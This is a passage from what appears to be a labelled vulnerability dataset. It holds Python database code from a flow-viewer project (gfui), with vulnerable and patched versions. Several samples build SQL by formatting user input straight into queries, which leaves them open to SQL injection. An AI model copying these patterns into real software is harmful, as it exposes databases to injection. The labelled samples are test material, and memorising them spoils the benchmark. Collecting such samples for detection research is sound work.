my_pubs = db.session.query(Pub).filter(Pub.id.in_(ids)).all()\n    for row in rows:\n        my_id = row[0]\n        for my_pub in my_pubs:\n            if my_id == my_pub.id:\n                my_pub.snippet = row[1]\n                my_pub.score = row[2]\n    return my_pubs\n\ndef autocomplete_phrases(query):\n    query_string = ur\"\"\"\n        with s as (SELECT id, lower(title) as lower_title FROM pub_2018 WHERE title iLIKE '%{query}%')\n        select match, count(*) as score from (\n            SELECT regexp_matches(lower_title, '({query}\\w*?\\M)', 'g') as match FROM s\n            union all\n            SELECT regexp_matches(lower_title, '({query}\\w*?(?:\\s+\\w+){{1}})\\M', 'g') as match FROM s\n            union all\n            SELECT regexp_matches(lower_title, '({query}\\w*?(?:\\s+\\w+){{2}})\\M', 'g') as match FROM s\n            union all\n            SELECT regexp_matches(lower_title, '({query}\\w*?(?:\\s+\\w+){{3}}|)\\M', 'g') as match FROM s\n        ) s_all\n        group by match\n        order by score desc, length(match::text) asc\n        LIMIT 50;\"\"\".format(query=query)\n\n    rows = db.engine.execute(sql.text(query_string)).fetchall()\n    phrases = [{\"phrase\":row[0][0], \"score\":row[1]} for row in rows if row[0][0]]\n    return phrases/n/n/n", "label": 1}, {"id": "ef6a4d5639653ecfe27fd2335752fc98e7352075", "code": "gfui/backends/Timescaledb/timescaledb.py/n/nfrom gfui.backends.default import Backend\nimport psycopg2\nfrom gfui.chartgraph import Graph, Table\nimport re\nimport ipaddress\nimport os\n\nclass Timescaledb_backend(Backend):\n    def __init__(self, OPTIONS):\n        super().__init__()\n        self.required_opts = ['SQL_SERVER', 'SQL_USERNAME', 'SQL_DB']\n        self.parse_options(OPTIONS)\n        self.columns = {}\n\n        pw = os.environ.get(\"SQL_PASSWORD\")\n        if not pw:\n            pw = self.OPTIONS['SQL_PASSWORD']\n\n        self.db = psycopg2.connect(\n            \"dbname={0} user={1} password={2} host={3}\".format(\n                self.OPTIONS['SQL_DB'],\n                self.OPTIONS['SQL_USERNAME'],\n                pw,\n                self.OPTIONS['SQL_SERVER']\n            )\n        )\n\n        self.schema = Schema()\n\n        self.filters = []\n\n    def get_columns(self):\n        return self.schema.get_columns()\n\n    def add_filter(self, op, value):\n        self.schema.add_filter(value, op)\n\n    def get_int_columns(self):\n        return self.schema.get_int_columns()\n\n    def flow_table(self, limit=10):\n        db = self.db\n        self.schema.limit = limit\n        FLOWS = self.schema.flows()\n\n        cursor = self.schema.query(db, FLOWS)\n        r = cursor.fetchall()\n        t = Table()\n        t = t.table_from_rows(r, self.schema.column_order)\n        return t\n\n    def topn_sum_graph(self, field, sum_by, limit=10):\n        db = self.db\n        self.schema.limit = limit\n        FLOWS_PER_IP = self.schema.topn_sum(field, sum_by)\n\n        cursor = db.cursor()\n        cursor.execute(FLOWS_PER_IP)\n        r = cursor.fetchall()\n        g = Graph()\n        g.name = \"TopN {0}\".format(field)\n        g.set_headers([\n            field,\n            \"Total\"\n        ])\n        g.graph_from_rows(r, 0)\n        return g\n\nclass Column:\n    \"\"\"\n    Column\n\n    Column handling class.\n    Governs how query strings are built and helper functons for returned data.\n    \"\"\"\n    def __init__(self, name, display_name=None):\n        self.name = name\n        self.display_name = display_name\n        self.type = 'text'\n        self.filter_string = None\n\n    def get_display_name(self):\n        return self.display_name\n\n    def select(self):\n        return \"{0}\".format(self.name)\n\n    def filter(self, value, op=None):\n        if self.filter_string:\n            self.filter_string = self.filter_string + \"AND {2} {0} \\\"{1}\\\"\".format(op, value, self.name)\n        else:\n            self.filter_string = \"{2} {0} \\\"{1}\\\"\".format(op, value, self.name)\n\nclass IP4Column(Column):\n    def __init__(self, name, display_name=None):\n        super().__init__(name, display_name)\n        self.type = \"ip\"\n\n    def select(self):\n        return \"{0}\".format(self.name)\n\n    def filter(self, value, op=None):\n        s = value.split(\"/\")\n        if len(s) > 1:\n            self.filter_string = \"({0} << '{1}'\".format(self.name, value)\n        else:\n            self.filter_string = \"{0} = '{1}'\".format(self.name, value)\n\n        return self.filter_string\n\nclass IP6Column(Column):\n    def __init__(self, name, display_name=None):\n        super().__init__(name, display_name)\n        self.type = \"ip6\"\n\n    def select(self):\n        return \"{0}\".format(self.name)\n\n    def filter(self, value, op=None):\n        s = value.split(\"/\")\n        if len(s) > 1:\n            ip = ipaddress.ip_network(value, strict=False)\n            start_ip = ip.network_address\n            end_ip = ip.broadcast_address\n            self.filter_string = \"({0} > {1} AND {0} < {2})\".format(self.name, int(start_ip), int(end_ip))\n        else:\n            ip = ipaddress.ip_address(value)\n            self.filter_string = \"{0} = {1}\".format(self.name, int(ip))\n\n        return self.filter_string\n\nclass IntColumn(Column):\n    def __init__(self, name, display_name=None):\n        super().__init__(name, display_name)\n        self.type = 'int'\n\n    def select(self):\n        return \"{0}\".format(self.name)\n\n    def filter(self, value, op=None):\n        self.filter_string = \"{0} = {1}\".format(self.name, value)\n        return self.filter_string\n\nclass PortColumn(Column):\n    def __init__(self, name, display_name=None):\n        super().__init__(name, display_name)\n        self.type = 'port'\n\n    def select(self):\n        return \"{0}\".format(self.name)\n\n    def filter(self, value, op=None):\n        self.filter_string = \"{0} = %s\".format(self.name, value)\n        return self.filter_string\n\nclass Coalesce:\n    def __init__(self, name, columns, filter_func, display_name):\n        \"\"\"\n        Coalesce\n        Select from a list of columns whatever is not null\n        :param columns (List): Column objects\n        \"\"\"\n        self.name = name\n        self.columns = columns\n        # We assume that the passed columns are of roughly the same type\n        self.type = columns[0].type\n        self.column_selects = []\n        for c in columns:\n            self.column_selects.append(c.select())\n\n        self.filter_string = None\n        self.filter_func = filter_func\n        self.display_name = display_name\n\n    def get_display_name(self):\n        return self.display_name\n\n    def select(self):\n        fields = \", \".join(self.column_selects)\n        return \"COALESCE({0}) AS {1}\".format(fields, self.name)\n\n    def filter(self, value, op=None):\n        self.filter_string = self.filter_func(value, op)\n\nclass Schema:\n    \"\"\"\n    Schema\n\n    Defines the backend schema\n    Changes to the backend (naming, etc.) should be reflected here.\n    \"\"\"\n    def __init__(self):\n        # Default\n        self.limit = 10\n\n        self.column_order = [\n            \"last_switched\",\n            \"src_ip\",\n            \"src_port\",\n            \"dst_ip\",\n            \"dst_port\",\n            \"in_bytes\",\n        ]\n        src_ip_col = IP4Column(\"src_ip\", \"Source IP\")\n        src_ipv6_col = IP6Column(\"src_ipv6\", \"Source IPv6\")\n        dst_ip_col = IP4Column(\"dst_ip\", \"Destination IP\")\n        dst_ipv6_col = IP6Column(\"dst_ipv6\", \"DestinationIPv6\")\n\n        self.filter_val_list = []\n\n        # Columns\n        self.columns = {\n            \"last_switched\": Column(\"last_switched\", \"Last Switched\"),\n            \"src_ip\": Coalesce(\"src_c_ip\", [src_ip_col, src_ipv6_col], src_ip_col.filter, \"Source IP\"),\n            \"src_port\": PortColumn(\"src_port\", \"Source Port\"),\n            \"dst_ip\": Coalesce(\"dst_c_ip\", [dst_ip_col, dst_ipv6_col], dst_ip_col.filter, \"Destination IP\"),\n            \"dst_port\": PortColumn(\"dst_port\", \"Destination Port\"),\n            \"in_bytes\": IntColumn(\"in_bytes\", \"Input bytes\"),\n            \"in_pkts\": IntColumn(\"in_pkts\", \"Input Packets\"),\n        }\n\n        # Supported queries\n        self.QUERIES = {\n            \"TOPN\": self.topn\n        }\n\n        self.filters = []\n\n        self.filter_map = {\n            \"(\\d+\\-\\d+\\-\\d+)\": \"last_switched\",\n            \"src (\\d+\\.\\d+\\.\\d+\\.\\d+\\/\\d+|\\d+\\.\\d+\\.\\d+\\.\\d+)\": \"src_ip\",\n            \"dst (\\d+\\.\\d+\\.\\d+\\.\\d+\\/\\d+|\\d+\\.\\d+\\.\\d+\\.\\d+)\": \"dst_ip\",\n            \"src ([0-9]+)($|\\s)\": \"src_port\",\n            \"dst ([0-9]+)($|\\s)\": \"dst_port\",\n        }\n\n    def add_filter(self, value, op=\"=\"):\n        for regex, column in self.filter_map.items():\n            if re.search(regex, value):\n                m = re.search(regex, value)\n                v = m.group(1)\n                self.columns[column].filter(v, op)\n                self.filter_val_list.append(v)\n\n    def build_filter_string(self):\n        s = 'WHERE '\n        l = []\n        for c in self.columns.values():\n            if c.filter_string:\n                l.append(c.filter_string)\n\n        if len(l) > 0:\n            return s + \" AND \".join(l)\n        else:\n            return ''\n\n    def get_columns(self):\n        result = {}\n        for col_name, col in self.columns.items():\n            result[col_name] = col.get_display_name()\n\n        return result\n\n    def get_int_columns(self):\n        result = {}\n        for col_name, col in self.columns.items():\n            if col.type is \"int\":\n                result[col_name] = col.get_display_name()\n\n        return result\n\n    def topn(self, column):\n        count = \"last_switched\"\n        q = \"\"\"\n        SELECT {0}, count({1}) AS c FROM goflow_records {2} GROUP BY {0} ORDER BY c DESC\n        \"\"\".format(self.columns[column].select(), count, self.build_filter_string())\n        return self.query_boilerplate(q)\n\n    def topn_sum(self, column, sum_by):\n        q = \"\"\"\n        SELECT {0}, sum({1}) AS c FROM goflow_records {2} GROUP BY {3} ORDER BY c DESC\n        \"\"\".format(self.columns[column].select(), sum_by, self.build_filter_string(), self.columns[column].name)\n        return self.query_boilerplate(q)\n\n    def flows(self):\n        c = []\n        for col in self.column_order:\n            c.append(self.columns[col].select())\n        q = \"\"\"\n        SELECT {1} FROM goflow_records {0} ORDER BY last_switched DESC\n        \"\"\".format(self.build_filter_string(), \", \".join(c))\n        return self.query_boilerplate(q)\n\n    def query_boilerplate(self, q):\n        q = q + \"\"\"LIMIT {0}\"\"\".format(self.limit)\n        return q\n\n    def query(self, db, q):\n        cursor = db.cursor()\n        cursor.execute(q, self.filter_val_list)\n        return cursor/n/n/n", "label": 0}, {"id": "ef6a4d5639653ecfe27fd2335752fc98e7352075", "code": "/gfui/backends/Timescaledb/timescaledb.py/n/nfrom gfui.backends.default import Backend\nimport psycopg2\nfrom gfui.chartgraph import Graph, Table\nimport re\nimport ipaddress\nimport os\n\nclass Timescaledb_backend(Backend):\n    def __init__(self, OPTIONS):\n        super().__init__()\n        self.required_opts = ['SQL_SERVER', 'SQL_USERNAME', 'SQL_DB']\n        self.parse_options(OPTIONS)\n        self.columns = {}\n\n        pw = os.environ.get(\"SQL_PASSWORD\")\n        if not pw:\n            pw = self.OPTIONS['SQL_PASSWORD']\n\n        self.db = psycopg2.connect(\n            \"dbname={0} user={1} password={2} host={3}\".format(\n                self.OPTIONS['SQL_DB'],\n                self.OPTIONS['SQL_USERNAME'],\n                pw,\n                self.OPTIONS['SQL_SERVER']\n            )\n        )\n\n        self.schema = Schema()\n\n        self.filters = []\n\n    def get_columns(self):\n        return self.schema.get_columns()\n\n    def add_filter(self, op, value):\n        self.schema.add_filter(value, op)\n\n    def get_int_columns(self):\n        return self.schema.get_int_columns()\n\n    def flow_table(self, limit=10):\n        db = self.db\n        self.schema.limit = limit\n        FLOWS = self.schema.flows()\n\n        cursor = db.cursor()\n        cursor.execute(FLOWS)\n        r = cursor.fetchall()\n        t = Table()\n        t = t.table_from_rows(r, self.schema.column_order)\n        return t\n\n    def topn_sum_graph(self, field, sum_by, limit=10):\n        db = self.db\n        self.schema.limit = limit\n        FLOWS_PER_IP = self.schema.topn_sum(field, sum_by)\n\n        cursor = db.cursor()\n        cursor.execute(FLOWS_PER_IP)\n        r = cursor.fetchall()\n        g = Graph()\n        g.name = \"TopN {0}\".format(field)\n        g.set_headers([\n            field,\n            \"Total\"\n        ])\n        g.graph_from_rows(r, 0)\n        return g\n\nclass Column:\n    \"\"\"\n    Column\n\n    Column handling class.\n    Governs how query strings are built and helper functons for returned data.\n    \"\"\"\n    def __init__(self, name, display_name=None):\n        self.name = name\n        self.display_name = display_name\n        self.type = 'text'\n        self.filter_string = None\n\n    def get_display_name(self):\n        return self.display_name\n\n    def select(self):\n        return \"{0}\".format(self.name)\n\n    def filter(self, value, op=None):\n        if self.filter_string:\n            self.filter_string = self.filter_string + \"AND {2} {0} \\\"{1}\\\"\".format(op, value, self.name)\n        else:\n            self.filter_string = \"{2} {0} \\\"{1}\\\"\".format(op, value, self.name)\n\nclass IP4Column(Column):\n    def __init__(self, name, display_name=None):\n        super().__init__(name, display_name)\n        self.type = \"ip\"\n\n    def select(self):\n        return \"{0}\".format(self.name)\n\n    def filter(self, value, op=None):\n        s = value.split(\"/\")\n        if len(s) > 1:\n            self.filter_string = \"({0} << '{1}'\".format(self.name, value)\n        else:\n            self.filter_string = \"{0} = '{1}'\".format(self.name, value)\n\n        return self.filter_string\n\nclass IP6Column(Column):\n    def __init__(self, name, display_name=None):\n        super().__init__(name, display_name)\n        self.type = \"ip6\"\n\n    def select(self):\n        return \"{0}\".format(self.name)\n\n    def filter(self, value, op=None):\n        s = value.split(\"/\")\n        if len(s) > 1:\n            ip = ipaddress.ip_network(value, strict=False)\n            start_ip = ip.network_address\n            end_ip = ip.broadcast_address\n            self.filter_string = \"({0} > {1} AND {0} < {2})\".format(self.name, int(start_ip), int(end_ip))\n        else:\n            ip = ipaddress.ip_address(value)\n            self.filter_string = \"{0} = {1}\".format(self.name, int(ip))\n\n        return self.filter_string\n\nclass IntColumn(Column):\n    def __init__(self, name, display_name=None):\n        super().__init__(name, display_name)\n        self.type = 'int'\n\n    def select(self):\n        return \"{0}\".format(self.name)\n\n    def filter(self, value, op=None):\n        self.filter_string = \"{0} = {1}\".format(self.name, value)\n        return self.filter_string\n\nclass PortColumn(Column):\n    def __init__(self, name, display_name=None):\n        super().__init__(name, display_name)\n        self.type = 'port'\n\n    def select(self):\n        return \"{0}\".format(self.name)\n\n    def filter(self, value, op=None):\n        self.filter_string = \"{0} = {1}\".format(self.name, value)\n        return self.filter_string\n\nclass Coalesce:\n    def __init__(self, name, columns, filter_func, display_name):\n        \"\"\"\n        Coalesce\n        Select from a list of columns whatever is not null\n        :param columns (List): Column objects\n        \"\"\"\n        self.name = name\n        self.columns = columns\n        # We assume that the passed columns are of roughly the same type\n        self.type = columns[0].type\n        self.column_selects = []\n        for c in columns:\n            self.column_selects.append(c.select())\n\n        self.filter_string = None\n        self.filter_func = filter_func\n        self.display_name = display_name\n\n    def get_display_name(self):\n        return self.display_name\n\n    def select(self):\n        fields = \", \".join(self.column_selects)\n        return \"COALESCE({0}) AS {1}\".format(fields, self.name)\n\n    def filter(self, value, op=None):\n        self.filter_string = self.filter_func(value, op)\n\nclass Schema:\n    \"\"\"\n    Schema\n\n    Defines the backend schema\n    Changes to the backend (naming, etc.) should be reflected here.\n    \"\"\"\n    def __init__(self):\n        # Default\n        self.limit = 10\n\n        self.column_order = [\n            \"last_switched\",\n            \"src_ip\",\n            \"src_port\",\n            \"dst_ip\",\n            \"dst_port\",\n            \"in_bytes\",\n        ]\n        src_ip_col = IP4Column(\"src_ip\", \"Source IP\")\n        src_ipv6_col = IP6Column(\"src_ipv6\", \"Source IPv6\")\n        dst_ip_col = IP4Column(\"dst_ip\", \"Destination IP\")\n        dst_ipv6_col = IP6Column(\"dst_ipv6\", \"DestinationIPv6\")\n\n        # Filter tuples are filter values\n        self.filter_tuples = ()\n\n        # Columns\n        self.columns = {\n            \"last_switched\": Column(\"last_switched\", \"Last Switched\"),\n            \"src_ip\": Coalesce(\"src_c_ip\", [src_ip_col, src_ipv6_col], src_ip_col.filter, \"Source IP\"),\n            \"src_port\": PortColumn(\"src_port\", \"Source Port\"),\n            \"dst_ip\": Coalesce(\"dst_c_ip\", [dst_ip_col, dst_ipv6_col], dst_ip_col.filter, \"Destination IP\"),\n            \"dst_port\": PortColumn(\"dst_port\", \"Destination Port\"),\n            \"in_bytes\": IntColumn(\"in_bytes\", \"Input bytes\"),\n            \"in_pkts\": IntColumn(\"in_pkts\", \"Input Packets\"),\n        }\n\n        # Supported queries\n        self.QUERIES = {\n            \"TOPN\": self.topn\n        }\n\n        self.filters = []\n\n        self.filter_map = {\n            \"(\\d+\\-\\d+\\-\\d+)\": \"last_switched\",\n            \"src (\\d+\\.\\d+\\.\\d+\\.\\d+\\/\\d+|\\d+\\.\\d+\\.\\d+\\.\\d+)\": \"src_ip\",\n            \"dst (\\d+\\.\\d+\\.\\d+\\.\\d+\\/\\d+|\\d+\\.\\d+\\.\\d+\\.\\d+)\": \"dst_ip\",\n            \"src ([0-9]+)($|\\s)\": \"src_port\",\n            \"dst ([0-9]+)($|\\s)\": \"dst_port\",\n        }\n\n    def add_filter(self, value, op=\"=\"):\n        for regex, column in self.filter_map.items():\n            if re.search(regex, value):\n                m = re.search(regex, value)\n                v = m.group(1)\n                self.columns[column].filter(v, op)\n\n    def build_filter_string(self):\n        s = 'WHERE '\n        l = []\n        for c in self.columns.values():\n            if c.filter_string:\n                l.append(c.filter_string)\n\n        if len(l) > 0:\n            return s + \" AND \".join(l)\n        else:\n            return ''\n\n    def get_columns(self):\n        result = {}\n        for col_name, col in self.columns.items():\n            result[col_name] = col.get_display_name()\n\n        return result\n\n    def get_int_columns(self):\n        result = {}\n        for col_name, col in self.columns.items():\n            if col.type is \"int\":\n                result[col_name] = col.get_display_name()\n\n        return result\n\n    def topn(self, column):\n        count = \"last_switched\"\n        q = \"\"\"\n        SELECT {0}, count({1}) AS c FROM goflow_records {2} GROUP BY {0} ORDER BY c DESC\n        \"\"\".format(self.columns[column].select(), count, self.build_filter_string())\n        return self.query_boilerplate(q)\n\n    def topn_sum(self, column, sum_by):\n        q = \"\"\"\n        SELECT {0}, sum({1}) AS c FROM goflow_records {2} GROUP BY {3} ORDER BY c DESC\n        \"\"\".format(self.columns[column].select(), sum_by, self.build_filter_string(), self.columns[column].name)\n        return self.query_boilerplate(q)\n\n    def flows(self):\n        c = []\n        for col in self.column_order:\n            c.append(self.columns[col].select())\n        q = \"\"\"\n        SELECT {1} FROM goflow_records {0} ORDER BY last_switched DESC\n        \"\"\".format(self.build_filter_string(), \", \".join(c))\n        return self.query_boilerplate(q)\n\n    def query_boilerplate(self, q):\n        q = q + \"\"\"LIMIT {0}\"\"\".format(self.limit)\n        return q\n\n    def query(self, db, q):\n        cursor = db.cursor()\n        cursor.execute(q, self.filter_tuples)/n/n/n", "label": 1}, {"id": "abd763746d7ff1d40571fed8ed46fce2211f3deb", "code": "gfui/backends/Mysql/mysql.py/n/nfrom gfui.backends.default import Backend\nimport mysql.connector\nfrom gfui.chartgraph import Graph, Table\nimport re\nimport ipaddress\nimport os\n\nclass Mysql_backend(Backend):\n    def __init__(self, OPTIONS):\n        super().__init__()\n        self.required_opts = ['SQL_SERVER', 'SQL_USERNAME', 'SQL_DB']\n        self.parse_options(OPTIONS)\n        self.columns = {}\n\n        pw = os.environ.get(\"SQL_PASSWORD\")\n        if not pw:\n            pw = self.OPTIONS['SQL_PASSWORD']\n\n        self.db = mysql.connector.connect(\n            host=self.OPTIONS['SQL_SERVER'],\n            user=self.OPTIONS['SQL_USERNAME'],\n            passwd=pw,\n            database=self.OPTIONS['SQL_DB']\n\n\n        )\n\n        self.schema = Schema()\n\n        self.filters = []\n\n    def get_columns(self):\n        return self.schema.get_columns()\n\n    def add_filter(self, op, value):\n        self.schema.add_filter(value, op)\n\n    def get_int_columns(self):\n        return self.schema.get_int_columns()\n\n    def flow_table(self, limit=10):\n        db = self.db\n        self.schema.limit = limit\n\n        FLOWS = self.schema.flows()\n        cursor = self.schema.query(db, FLOWS)\n        r = cursor.fetchall()\n        t = Table()\n        t = t.table_from_rows(r, self.schema.column_order)\n        return t\n\n    def topn_sum_graph(self, field, sum_by, limit=10):\n        db = self.db\n        self.schema.limit = limit\n        FLOWS_PER_IP = self.schema.topn_sum(field, sum_by)\n\n        cursor = db.cursor()\n        cursor.execute(\"USE testgoflow\")\n        cursor.execute(FLOWS_PER_IP)\n        r = cursor.fetchall()\n        g = Graph()\n        g.name = \"TopN {0}\".format(field)\n        g.set_headers([\n            field,\n            \"Total\"\n        ])\n        g.graph_from_rows(r, 0)\n        return g\n\nclass Column:\n    \"\"\"\n    Column\n\n    Column handling class.\n    Governs how query strings are built and helper functons for returned data.\n    \"\"\"\n    def __init__(self, name, display_name=None):\n        self.name = name\n        self.display_name = display_name\n        self.type = 'text'\n        self.filter_string = None\n\n    def get_display_name(self):\n        return self.display_name\n\n    def select(self):\n        return \"{0}\".format(self.name)\n\n    def filter(self, value, op=None):\n        if self.filter_string:\n            self.filter_string = self.filter_string + \"AND {2} {0} \\\"{1}\\\"\".format(op, value, self.name)\n        else:\n            self.filter_string = \"{2} {0} \\\"{1}\\\"\".format(op, value, self.name)\n\nclass IP4Column(Column):\n    def __init__(self, name, display_name=None):\n        super().__init__(name, display_name)\n        self.type = \"ip\"\n\n    def select(self):\n        return \"inet_ntoa({0})\".format(self.name)\n\n    def filter(self, value, op=None):\n        s = value.split(\"/\")\n        if len(s) > 1:\n            ip = ipaddress.ip_network(value, strict=False)\n            start_ip = ip.network_address\n            end_ip = ip.broadcast_address\n            self.filter_string = \"({0} > {1} AND {0} < {2})\".format(self.name, int(start_ip), int(end_ip))\n        else:\n            ip = ipaddress.ip_address(value)\n            self.filter_string = \"{0} = {1}\".format(self.name, int(ip))\n\n        return self.filter_string\n\nclass IP6Column(Column):\n    def __init__(self, name, display_name=None):\n        super().__init__(name, display_name)\n        self.type = \"ip6\"\n\n    def select(self):\n        return \"inet6_ntoa({0})\".format(self.name)\n\n    def filter(self, value, op=None):\n        s = value.split(\"/\")\n        if len(s) > 1:\n            ip = ipaddress.ip_network(value, strict=False)\n            start_ip = ip.network_address\n            end_ip = ip.broadcast_address\n            self.filter_string = \"({0} > {1} AND {0} < {2})\".format(self.name, int(start_ip), int(end_ip))\n        else:\n            ip = ipaddress.ip_address(value)\n            self.filter_string = \"{0} = {1}\".format(self.name, int(ip))\n\n        return self.filter_string\n\nclass IntColumn(Column):\n    def __init__(self, name, display_name=None):\n        super().__init__(name, display_name)\n        self.type = 'int'\n\n    def select(self):\n        return \"{0}\".format(self.name)\n\n    def filter(self, value, op=None):\n        self.filter_string = \"{0} = %s\".format(self.name)\n        return self.filter_string\n\nclass PortColumn(Column):\n    def __init__(self, name, display_name=None):\n        super().__init__(name, display_name)\n        self.type = 'port'\n\n    def select(self):\n        return \"{0}\".format(self.name)\n\n    def filter(self, value, op=None):\n        self.filter_string = \"{0} = %s\".format(self.name)\n        return self.filter_string\n\nclass Coalesce:\n    def __init__(self, name, columns, filter_func, display_name):\n        \"\"\"\n        Coalesce\n        Select from a list of columns whatever is not null\n        :param columns (List): Column objects\n        \"\"\"\n        self.name = name\n        self.columns = columns\n        # We assume that the passed columns are of roughly the same type\n        self.type = columns[0].type\n        self.column_selects = []\n        for c in columns:\n            self.column_selects.append(c.select())\n\n        self.filter_string = None\n        self.filter_func = filter_func\n        self.display_name = display_name\n\n    def get_display_name(self):\n        return self.display_name\n\n    def select(self):\n        fields = \", \".join(self.column_selects)\n        return \"COALESCE({0}) AS {1}\".format(fields, self.name)\n\n    def filter(self, value, op=None):\n        self.filter_string = self.filter_func(value, op)\n\nclass Schema:\n    \"\"\"\n    Schema\n\n    Defines the backend schema\n    Changes to the backend (naming, etc.) should be reflected here.\n    \"\"\"\n    def __init__(self):\n        # Default\n        self.limit = 10\n\n        self.column_order = [\n            \"last_switched\",\n            \"src_ip\",\n            \"src_port\",\n            \"dst_ip\",\n            \"dst_port\",\n            \"in_bytes\",\n        ]\n        src_ip_col = IP4Column(\"src_ip\", \"Source IP\")\n        src_ipv6_col = IP6Column(\"src_ipv6\", \"Source IPv6\")\n        dst_ip_col = IP4Column(\"dst_ip\", \"Destination IP\")\n        dst_ipv6_col = IP6Column(\"dst_ipv6\", \"DestinationIPv6\")\n\n        self.filter_val_list = []\n\n        # Columns\n        self.columns = {\n            \"last_switched\": Column(\"last_switched\", \"Last Switched\"),\n            \"src_ip\": Coalesce(\"src_c_ip\", [src_ip_col, src_ipv6_col], src_ip_col.filter, \"Source IP\"),\n            \"src_port\": PortColumn(\"src_port\", \"Source Port\"),\n            \"dst_ip\": Coalesce(\"dst_c_ip\", [dst_ip_col, dst_ipv6_col], dst_ip_col.filter, \"Destination IP\"),\n            \"dst_port\": PortColumn(\"dst_port\", \"Destination Port\"),\n            \"in_bytes\": IntColumn(\"in_bytes\", \"Input bytes\"),\n            \"in_pkts\": IntColumn(\"in_pkts\", \"Input Packets\"),\n        }\n\n        # Supported queries\n        self.QUERIES = {\n            \"TOPN\": self.topn\n        }\n\n        self.filters = []\n\n        self.filter_map = {\n            \"(\\d+\\-\\d+\\-\\d+)\": \"last_switched\",\n            \"src (\\d+\\.\\d+\\.\\d+\\.\\d+\\/\\d+|\\d+\\.\\d+\\.\\d+\\.\\d+)\": \"src_ip\",\n            \"dst (\\d+\\.\\d+\\.\\d+\\.\\d+\\/\\d+|\\d+\\.\\d+\\.\\d+\\.\\d+)\": \"dst_ip\",\n            \"src ([0-9]+)($|\\s)\": \"src_port\",\n            \"dst ([0-9]+)($|\\s)\": \"dst_port\",\n        }\n\n    def add_filter(self, value, op=\"=\"):\n        for regex, column in self.filter_map.items():\n            if re.search(regex, value):\n                m = re.search(regex, value)\n                v = m.group(1)\n                self.columns[column].filter(v, op)\n                self.filter_val_list.append(v)\n\n\n    def build_filter_string(self):\n        s = 'WHERE '\n        l = []\n        for c in self.columns.values():\n            if c.filter_string:\n                l.append(c.filter_string)\n\n        if len(l) > 0:\n            return s + \" AND \".join(l)\n        else:\n            return ''\n\n    def get_columns(self):\n        result = {}\n        for col_name, col in self.columns.items():\n            result[col_name] = col.get_display_name()\n\n        return result\n\n    def get_int_columns(self):\n        result = {}\n        for col_name, col in self.columns.items():\n            if col.type is \"int\":\n                result[col_name] = col.get_display_name()\n\n        return result\n\n    def topn(self, column):\n        count = \"last_switched\"\n        q = \"\"\"\n        SELECT {0}, count({1}) AS c FROM goflow_records {2} GROUP BY {0} ORDER BY c DESC\n        \"\"\".format(self.columns[column].select(), count, self.build_filter_string())\n        return self.query_boilerplate(q)\n\n    def topn_sum(self, column, sum_by):\n        q = \"\"\"\n        SELECT {0}, sum({1}) AS c FROM test_goflow_records {2} GROUP BY {3} ORDER BY c DESC\n        \"\"\".format(self.columns[column].select(), sum_by, self.build_filter_string(), self.columns[column].name)\n        return self.query_boilerplate(q)\n\n    def flows(self):\n        c = []\n        for col in self.column_order:\n            c.append(self.columns[col].select())\n        q = \"\"\"\n        SELECT {1} FROM goflow_records {0} ORDER BY last_switched DESC\n        \"\"\".format(self.build_filter_string(), \", \".join(c))\n        return self.query_boilerplate(q)\n\n    def query_boilerplate(self, q):\n        q = q + \"\"\"LIMIT {0}\"\"\".format(self.limit)\n        return q\n\n    def query(self, db, q):\n        cursor = db.cursor()\n        if len(self.filter_val_list) > 0:\n            print(self.filter_val_list)\n            cursor.execute(q, self.filter_val_list)\n        else:\n            cursor.execute(q)\n        return cursor/n/n/ngfui/backends/Timescaledb/timescaledb.py/n/nfrom gfui.backends.default import Backend\nimport psycopg2\nfrom gfui.chartgraph import Graph, Table\nimport re\nimport ipaddress\nimport os\n\nclass Timescaledb_backend(Backend):\n    def __init__(self, OPTIONS):\n        super().__init__()\n        self.required_opts = ['SQL_SERVER', 'SQL_USERNAME', 'SQL_DB']\n        self.parse_options(OPTIONS)\n        self.columns = {}\n\n        pw = os.environ.get(\"SQL_PASSWORD\")\n        if not pw:\n            pw = self.OPTIONS['SQL_PASSWORD']\n\n        self.db = psycopg2.connect(\n            \"dbname={0} user={1} password={2} host={3}\".format(\n                self.OPTIONS['SQL_DB'],\n                self.OPTIONS['SQL_USERNAME'],\n                pw,\n                self.OPTIONS['SQL_SERVER']\n            )\n        )\n\n        self.schema = Schema()\n\n        self.filters = []\n\n    def get_columns(self):\n        return self.schema.get_columns()\n\n    def add_filter(self, op, value):\n        self.schema.add_filter(value, op)\n\n    def get_int_columns(self):\n        return self.schema.get_int_columns()\n\n    def flow_table(self, limit=10):\n        db = self.db\n        self.schema.limit = limit\n        FLOWS = self.schema.flows()\n\n        cursor = self.schema.query(db, FLOWS)\n        r = cursor.fetchall()\n        t = Table()\n        t = t.table_from_rows(r, self.schema.column_order)\n        return t\n\n    def topn_sum_graph(self, field, sum_by, limit=10):\n        db = self.db\n        self.schema.limit = limit\n        FLOWS_PER_IP = self.schema.topn_sum(field, sum_by)\n\n        cursor = self.schema.query(db, FLOWS_PER_IP)\n        r = cursor.fetchall()\n        g = Graph()\n        g.name = \"TopN {0}\".format(field)\n        g.set_headers([\n            field,\n            \"Total\"\n        ])\n        g.graph_from_rows(r, 0)\n        return g\n\nclass Column:\n    \"\"\"\n    Column\n\n    Column handling class.\n    Governs how query strings are built and helper functons for returned data.\n    \"\"\"\n    def __init__(self, name, display_name=None):\n        self.name = name\n        self.display_name = display_name\n        self.type = 'text'\n        self.filter_string = None\n\n    def get_display_name(self):\n        return self.display_name\n\n    def select(self):\n        return \"{0}\".format(self.name)\n\n    def filter(self, value, op=None):\n        if self.filter_string:\n            self.filter_string = self.filter_string + \"AND {2} {0} \\\"{1}\\\"\".format(op, value, self.name)\n        else:\n            self.filter_string = \"{2} {0} \\\"{1}\\\"\".format(op, value, self.name)\n\nclass IP4Column(Column):\n    def __init__(self, name, display_name=None):\n        super().__init__(name, display_name)\n        self.type = \"ip\"\n\n    def select(self):\n        return \"{0}\".format(self.name)\n\n    def filter(self, value, op=None):\n        s = value.split(\"/\")\n        if len(s) > 1:\n            self.filter_string = \"{0} << %s\".format(self.name, value)\n        else:\n            self.filter_string = \"{0} = %s\".format(self.name, value)\n\n        return self.filter_string\n\nclass IP6Column(Column):\n    def __init__(self, name, display_name=None):\n        super().__init__(name, display_name)\n        self.type = \"ip6\"\n\n    def select(self):\n        return \"{0}\".format(self.name)\n\n    def filter(self, value, op=None):\n        s = value.split(\"/\")\n        if len(s) > 1:\n            self.filter_string = \"{0} << %s\".format(self.name, value)\n        else:\n            self.filter_string = \"{0} = %s\".format(self.name, value)\n\n        return self.filter_string\n\nclass IntColumn(Column):\n    def __init__(self, name, 